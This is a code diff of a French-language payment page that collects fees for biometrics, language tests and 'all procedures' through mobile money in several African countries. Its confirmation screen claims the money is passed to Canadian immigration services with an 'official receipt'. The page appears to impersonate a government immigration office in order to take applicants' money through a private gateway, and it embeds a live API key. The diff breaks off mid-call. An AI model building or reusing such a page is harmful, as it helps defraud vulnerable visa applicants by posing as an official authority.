@@ -216,83 +216,87 @@ button:hover{
     <div class="progress-step" id="p3">3</div>
   </div>
 
-  <!-- ÉTAPE 1 : SERVICE, EMAIL & RDV -->
-  <div class="step active" id="step1">
-    <div class="form-group">
-      <label for="service">Sélectionnez le service administratif</label>
-      <select id="service" onchange="calculateAmounts()">
-        <option value="85">1 - Demande biométrique - 85 USD</option>
-        <option value="150">2 - Test de langue - 150 USD</option>
-        <option value="220">3 - Droit administratif - 220 USD</option>
-        <option value="455">4 - Toutes les procédures - 455 USD</option>
-      </select>
+  <form id="paymentForm" onsubmit="event.preventDefault();">
+
+    <!-- ÉTAPE 1 : SERVICE, EMAIL & DATE -->
+    <div class="step active" id="step1">
+      <div class="form-group">
+        <label for="service">Sélectionnez le service administratif</label>
+        <select id="service" onchange="calculateAmounts()">
+          <option value="85">1 - Demande biométrique - 85 USD</option>
+          <option value="150">2 - Test de langue - 150 USD</option>
+          <option value="220">3 - Droit administratif - 220 USD</option>
+          <option value="455">4 - Toutes les procédures - 455 USD</option>
+        </select>
+      </div>
+
+      <div class="form-group">
+        <label for="email">Adresse e-mail (Pour l'envoi du reçu officiel)</label>
+        <input type="email" id="email" placeholder="exemple@domaine.com" required>
+      </div>
+
+      <div class="form-group">
+        <label for="rdvDate">Sélectionnez votre date de rendez-vous</label>
+        <input type="date" id="rdvDate" required>
+      </div>
+
+      <button type="button" onclick="goToStep2()">Continuer vers le paiement</button>
     </div>
 
-    <div class="form-group">
-      <label for="email">Adresse e-mail (Pour l'envoi du reçu officiel)</label>
-      <input type="email" id="email" placeholder="exemple@domaine.com" required>
+    <!-- ÉTAPE 2 : CONFIGURATION DU PAIEMENT -->
+    <div class="step" id="step2">
+      <div class="form-group">
+        <label for="country">Sélectionnez votre pays</label>
+        <select id="country" onchange="updateOperators(); calculateAmounts();">
+          <option value="BEN">Bénin</option>
+          <option value="CIV">Côte d'Ivoire</option>
+          <option value="CMR">Cameroun</option>
+          <option value="COD">RDC (Congo-Kinshasa)</option>
+          <option value="COG">Congo-Brazzaville</option>
+          <option value="GAB">Gabon</option>
+          <option value="SEN">Sénégal</option>
+        </select>
+      </div>
+
+      <div class="form-group">
+        <label for="operator">Opérateur de paiement mobile</label>
+        <select id="operator"></select>
+      </div>
+
+      <div class="form-group">
+        <label for="phone">Numéro de téléphone Mobile Money</label>
+        <div class="row">
+          <input id="prefix" class="prefix" readonly>
+          <input type="text" id="phone" class="phone" placeholder="Numéro local" required>
+        </div>
+      </div>
+
+      <div class="amount-display">
+        <p id="amountLocal">Montant à payer : --</p>
+        <p id="amountUsd">Équivalent : -- USD</p>
+      </div>
+
+      <button type="button" onclick="declencherPaiement()">Confirmer et Payer</button>
+      <button type="button" class="btn-secondary" onclick="goBackToStep1()">Retour</button>
     </div>
 
-    <div class="form-group">
-      <label for="rdvDate">Sélectionnez votre date de rendez-vous</label>
-      <input type="date" id="rdvDate" required>
-    </div>
-
-    <button type="button" onclick="goToStep2()">Continuer vers le paiement</button>
-  </div>
-
-  <!-- ÉTAPE 2 : CONFIGURATION DU PAIEMENT -->
-  <div class="step" id="step2">
-    <div class="form-group">
-      <label for="country">Sélectionnez votre pays</label>
-      <select id="country" onchange="updateOperators(); calculateAmounts();">
-        <option value="BEN">Bénin</option>
-        <option value="CIV">Côte d'Ivoire</option>
-        <option value="CMR">Cameroun</option>
-        <option value="COD">RDC (Congo-Kinshasa)</option>
-        <option value="COG">Congo-Brazzaville</option>
-        <option value="GAB">Gabon</option>
-        <option value="SEN">Sénégal</option>
-      </select>
-    </div>
-
-    <div class="form-group">
-      <label for="operator">Opérateur de paiement mobile</label>
-      <select id="operator"></select>
-    </div>
-
-    <div class="form-group">
-      <label for="phone">Numéro de téléphone Mobile Money</label>
-      <div class="row">
-        <input id="prefix" class="prefix" readonly>
-        <input type="text" id="phone" class="phone" placeholder="Numéro local">
+    <!-- ÉTAPE 3 : REMERCIEMENT ET CONFIRMATION -->
+    <div class="step" id="step3">
+      <div class="success-icon">✓</div>
+      <h4 style="color: #4caf50; margin-top: 0;">Paiement Traité avec Succès !</h4>
+      
+      <p style="text-align: left; font-size: 14px; color: #444; line-height: 1.5;">
+        Merci pour votre confiance. Votre demande de paiement a été transmise aux services de l'Immigration canadienne.
+      </p>
+      
+      <div style="background: #f9f9f9; padding: 12px; border-radius: 6px; text-align: left; font-size: 13px; margin-top: 15px; border: 1px dashed #ccc;">
+        <strong>Récapitulatif de validation :</strong><br>
+        • Un reçu officiel est envoyé à : <span id="confirmEmail" style="color:#00bcd4; font-weight:bold;"></span><br>
+        • Votre rendez-vous est bloqué pour le : <span id="confirmDate" style="font-weight:bold;"></span>
       </div>
     </div>
 
-    <div class="amount-display">
-      <p id="amountLocal">Montant à payer : --</p>
-      <p id="amountUsd">Équivalent : -- USD</p>
-    </div>
-
-    <button type="button" onclick="declencherPaiement()">Confirmer et Payer</button>
-    <button type="button" class="btn-secondary" onclick="goBackToStep1()">Retour</button>
-  </div>
-
-  <!-- ÉTAPE 3 : REMERCIEMENT ET CONFIRMATION -->
-  <div class="step" id="step3">
-    <div class="success-icon">✓</div>
-    <h4 style="color: #4caf50; margin-top: 0;">Paiement Traité avec Succès !</h4>
-    
-    <p style="text-align: left; font-size: 14px; color: #444; line-height: 1.5;">
-      Merci pour votre confiance. Votre demande de paiement a été transmise aux services de l'Immigration canadienne.
-    </p>
-    
-    <div style="background: #f9f9f9; padding: 12px; border-radius: 6px; text-align: left; font-size: 13px; margin-top: 15px; border: 1px dashed #ccc;">
-      <strong>Récapitulatif de validation :</strong><br>
-      • Un reçu officiel est envoyé à : <span id="confirmEmail" style="color:#00bcd4; font-weight:bold;"></span><br>
-      • Votre rendez-vous est bloqué pour le : <span id="confirmDate" style="font-weight:bold;"></span>
-    </div>
-  </div>
+  </form>
 
 </div>
 
@@ -388,10 +392,3 @@ function declencherPaiement(){
 
   const usdAmount = parseFloat(document.getElementById('service').value);
   const userEmail = document.getElementById('email').value;
-  const userDate = document.getElementById('rdvDate').value;
-
-  if(typeof LeekPay !== "undefined") {
-    LeekPay.checkout({
-      amount: usdAmount,
-      currency: "USD",
-      apiKey: "pk_live_OIf3UkphEVWIVAJdd7VB6KWEm7IBuDwK"
